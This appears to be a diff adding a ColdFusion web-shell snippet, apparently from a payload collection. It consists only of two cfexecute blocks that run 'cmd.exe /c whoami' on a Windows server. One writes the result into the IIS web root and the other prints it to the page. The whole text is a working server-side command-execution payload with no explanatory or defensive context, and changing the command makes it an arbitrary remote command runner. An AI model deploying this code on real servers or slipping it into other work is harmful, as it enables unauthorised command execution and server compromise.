@@ -1,0 +1,14 @@
+#Execute command to output file
+<cfexecute name = "C:\windows\System32\cmd.exe" 
+arguments = "/c whoami" 
+outputFile = "c:\inetpub\wwwroot\output.txt" 
+timeout = "1"> 
+</cfexecute>
+
+#Execute command display output to page
+<cfexecute name = "C:\windows\System32\cmd.exe" 
+arguments = "/c whoami" 
+variable = "result"
+timeout = "1"> 
+</cfexecute>
+<cfoutput>#result#</cfoutput>
